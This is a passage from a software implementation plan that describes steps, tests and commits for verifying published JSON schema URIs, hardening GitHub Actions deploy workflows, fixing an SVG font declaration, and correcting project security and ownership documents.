    last: Exception | None = None
    for attempt in range(1, ATTEMPTS + 1):
        try:
            doc = fetch(url)
        except (urllib.error.URLError, json.JSONDecodeError, UnicodeDecodeError) as error:
            last = error
            print(f"attempt {attempt}/{ATTEMPTS}: {url} not ready ({error})")
            if attempt < ATTEMPTS:
                time.sleep(DELAY_SECONDS)
            continue
        if not isinstance(doc, dict):
            # It parsed and it is wrong. Retrying cannot change a served document,
            # and .get on a list raises an AttributeError instead of reporting.
            raise SystemExit(f"::error::{url} is not a JSON object, served {type(doc).__name__}")
        served = doc.get("$id")
        if served != url:
            raise SystemExit(f"::error::{url} serves $id {served!r}, expected its own URL")
        print(f"ok: {url} serves its own $id")
        return
    raise SystemExit(f"::error::{url} never became available: {last}")
```

Replace `main`:

```python
def main(argv: list[str]) -> int:
    if len(argv) >= 4 and argv[2] == "--from":
        paths = paths_from(Path(argv[3]))
    elif len(argv) >= 3:
        paths = argv[2:]
    else:
        print(
            "usage: verify_published.py <base-url> --from <schema-source-dir>\n"
            "   or: verify_published.py <base-url> <path> [<path> ...]",
            file=sys.stderr,
        )
        return 2
    for path in paths:
        check(argv[1], path)
    return 0
```

- [ ] **Step 4: Point both workflows at the whole tree**

In `.github/workflows/deploy-pages.yml` and `.github/workflows/monitor-pages.yml`, replace the two hardcoded paths in each verify step with `--from specification`. Both workflows already check out the repository, so the tree is present.

- [ ] **Step 5: Compute the branch condition once**

In `.github/workflows/deploy-pages.yml` the compound condition is copied onto two steps. A typo in one copy skips the step rather than failing it, so the job reports green having uploaded no artifact. Add one step near the top of the `build` job:

```yaml
      - name: Decide whether this run deploys
        id: gate
        run: echo "publish=${{ github.event_name != 'pull_request' && github.ref == 'refs/heads/main' }}" >> "$GITHUB_OUTPUT"
```

Gate both the Configure Pages and Upload steps on `if: steps.gate.outputs.publish == 'true'`.

- [ ] **Step 6: Run the tests, check the workflows, check the live site**

```bash
uv run pytest -q
uv run python -c "import yaml,pathlib; [yaml.safe_load(p.read_text()) for p in pathlib.Path('.github/workflows').glob('*.yml')]; print('workflows parse')"
uv run python tools/verify_published.py \
  https://genai-security-project.github.io/agent-control-standard/schema --from specification
```

Expected: PASS, `workflows parse`, and 44 lines of `ok:` against the live site.

- [ ] **Step 7: Commit**

```bash
git add tools/verify_published.py tests/test_verify_published.py .github/workflows/
git commit -F - <<'MSG'
Verify every published URI, not two of forty-four

The post-deploy check named two paths, hardcoded identically in two workflows
with nothing keeping them in step. A defect in any of the other 42 shipped
undetected. The list now comes from the schema tree, which both workflows
already check out.

The checker had no test file, so three defects sat in it. A body that parsed as
a list raised AttributeError on .get instead of reporting. A decoding failure
was not retried. The loop slept ten seconds after its final attempt before
giving up.

A note on the non-object guard, because the earlier reasoning for it was wrong.
A Pages 404 serves HTML, which fails to parse and is retried, so that was not
the scenario. The guard is still right: a parsed non-object cannot be fixed by
waiting.

The deploy branch condition is computed once. Copied onto two steps, a typo in
one skips the step rather than failing it, uploading no artifact while green.
MSG
```

---

### Task 6: The starburst, the documents, and the ownership

**Files:**
- Modify: `landing/assets/starburst.svg`, `tests/test_landing_page.py`
- Modify: `SECURITY.md`, `CLAUDE.md`, `LICENSING.md`, `.github/CODEOWNERS`, `.gitignore`
- Modify: `design/2026-09-05-github-pages-landing.md`, `design/2026-09-05-deferred-findings-design.md`
- Modify: `tools/publish_schemas.py` (one comment)

**Interfaces:**
- Consumes: nothing. This task is independent of Tasks 1 through 5.
- Produces: nothing later tasks use.

- [ ] **Step 1: Write the failing test**

Add to `tests/test_landing_page.py`:

```python
def test_the_starburst_sets_its_font_on_the_root_element(starburst):
    """On the root, not merely present once.

    A declaration on the wrong element satisfies a count while leaving labels
    without a fallback stack.
    """
    root = ET.fromstring(starburst)
    assert "font-family" in root.attrib
    assert "sans-serif" in root.attrib["font-family"], "needs a fallback, not Inter alone"
    assert starburst.count("font-family") == 1, "the per-element copies should be gone"
```

Use the fixture name the file already uses for the SVG text. Add `import xml.etree.ElementTree as ET` if it is absent.

- [ ] **Step 2: Run it to verify it fails**

Run: `uv run pytest tests/test_landing_page.py -k starburst_sets -q`
Expected: FAIL. The root carries no `font-family` and fifteen `<text>` elements do.

- [ ] **Step 3: Move the font declaration to the root**

In `landing/assets/starburst.svg`, add to the root `<svg>` element:

```
font-family="Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif"
```

Delete the `font-family` attribute from all fifteen `<text>` elements. A `<text>` inside a `<g>` inherits it.

- [ ] **Step 4: Correct the documents**

`SECURITY.md`. Replace the two overlapping in-scope rows with this exact single row:

```markdown
| The build and publish tooling in `tools/` and the GitHub Actions workflows in `.github/workflows/` | Yes |
```

In the row describing the published site, delete the words `once Pages is enabled`. The site is live, and a conditional about a live property gives a defensive reading room to argue it was out of scope.

`CLAUDE.md`. Replace `The landing page links both, so publishing an address does not pull reports out of the processes that handle them independently.` with:

```markdown
The landing page links the security reporting process and the Code of Conduct process, so
publishing an address does not pull reports out of the processes that handle them
independently.
```

`LICENSING.md`. Move the provenance section so it sits after the scope table it explains.

`.gitignore`. Add under the existing scratch entries:

```
# Browser session logs. Never committed.
.playwright-mcp/
```

- [ ] **Step 5: Widen the restricted ownership tier**

In `.github/CODEOWNERS`, add three lines to the restricted block, copying the exact handle list from an existing restricted line rather than retyping it:

```
/CLAUDE.md    <the five restricted handles>
/STYLE.md     <the five restricted handles>
/design/      <the five restricted handles>
```

Later rules win in CODEOWNERS, so these must sit after the wide default.

- [ ] **Step 6: Record the closure and the follow-up**

In `tools/publish_schemas.py`, above the percent-decode check:

```python
    # SAFE_TAIL admits no % in any character class, so this is not the layer that
    # stops a percent-encoded traversal. It stays because it labels the attempt.
    # An operator reading a build log can tell someone trying something from
    # someone making a typo.
```

In `design/2026-09-05-github-pages-landing.md`, add to the Rollback section:

```markdown
A failed verification step is not a failed deploy. `actions/deploy-pages` runs before the
check, so a red run with a green deploy job means the site is live and the check could not
confirm it inside its retry window. Read the step log before reverting anything. Reverting
a good deploy because a check was unlucky costs more than waiting for the next run.
```

Append to `design/2026-09-05-deferred-findings-design.md`:

```markdown
## Tracked follow-up: specification/schema.lock

Deferred three times now. Published schemas are mutable in place with no hash record, so a
constraint loosened under a released spec version reaches every consumer resolving that
`$id` with no way to detect the change against a copy fetched earlier.

The work is a manifest of every published path and its hash, written at build time and
checked at deploy time. It carries release-process implications this change does not, which
is why it stays out of scope rather than being folded in.

This record replaces the public tracking issue an earlier plan specified. Opening one is
the project lead's decision to make separately, and `SECURITY.md` routes tooling flaws to
private reporting.
```

- [ ] **Step 7: Run everything**

```bash
uv run pytest -q
rm -rf /tmp/final && mkdir -p /tmp/final
GITHUB_PAGES_URL="https://genai-security-project.github.io/agent-control-standard" \
  uv run mkdocs build --strict -d /tmp/final/docs
uv run python tools/render_landing.py landing /tmp/final
uv run python tools/publish_schemas.py specification /tmp/final/schema
find /tmp/final/schema -type f | wc -l
```

Expected: PASS, a clean build of all three surfaces, and `44`.

- [ ] **Step 8: Commit**

```bash
git add landing/assets/starburst.svg tests/test_landing_page.py SECURITY.md CLAUDE.md \
        LICENSING.md .github/CODEOWNERS .gitignore design/ tools/publish_schemas.py
git commit -F - <<'MSG'
Correct the documents, widen the ownership tier, fix the starburst font

The starburst declared font-family on fifteen text elements and none on the
root, so a label would render without the fallback stack if one declaration
were dropped. It inherits from the root now.

SECURITY.md described the published site as conditional on Pages being enabled.
The site is live, and a conditional about a live property gives a defensive
reading room to argue it was out of scope. Two overlapping in-scope rows merge.

CLAUDE.md had a sentence whose subject was ambiguous about which two processes
the landing page links.

CODEOWNERS gains CLAUDE.md, STYLE.md, and design/. An earlier attempt at this
called CLAUDE.md the one root document absent from the restricted tier, which
was wrong: seven others were equally absent. STYLE.md binds every text edit in
the repository, and design/ holds the documents arguing the threat model for a
live publishing pipeline.

The schema.lock follow-up is recorded in the design document rather than a
public issue. SECURITY.md routes tooling flaws to private reporting, and an
implementation plan is the wrong place for a disclosure decision.
MSG
```

---

## After the tasks

Two actions outside the code, both approved by the project lead:

1. Add `test` and `build` as required status checks on the `protect-main` ruleset. It requires one approval and code-owner review today, and requires no passing check, so a pull request can merge red onto the branch that deploys on merge. The admin bypass stays as it is.
2. Run `superpowers:finishing-a-development-branch`, merging as admin.

## Self-Review

**Spec coverage.** All 32 findings map to a task. 1 and 23 to Task 2. 2 to Task 1. 3, 12 through 17, 20, 28, 30, 31 to Task 6. 4, 5, 24 through 27 to Task 3. 6, 7, 8, 18, 19 to Task 5. 9, 10, 11, 21, 22 to Task 4. 29 to the section above. 32 is out of scope in the spec and stays there.

**Deviations from the spec, both listed.** The spec says `load_schemas` returns bytes alongside each document. The plan adds a private `_read` instead and leaves `load_schemas` unchanged, so `render_landing.py` needs no edit for that. The spec describes the `xmlns` exemption as covering `xmlns`. The plan exempts any attribute whose prefix before a colon is `xmlns`, which also covers `xmlns:xlink`. An earlier version of this plan claimed one deviation while making two, so both appear here rather than only in a code comment.

**Placeholder scan.** No TBD, no "add error handling", no "similar to Task N". Every code step carries its code.

**Type consistency.** `target_for` takes three parameters from Task 1 onward, and Tasks 2, 3, and 5 all pass `source`. `_read` returns `dict[Path, tuple[dict, bytes]]` and only Task 2 consumes it. `_versions` returns `dict[str, int]` from Task 3, changed from `set[str]`, and `_schema_facts` is its only caller. `VENDORED_PREFIXES` is a tuple, and `str.startswith` accepts one.

**Ordering.** The starburst test sits in Task 6 with the starburst fix. An earlier version put it in Task 4, where that task's own verification step promised a passing suite that could not pass until Task 5 had run.
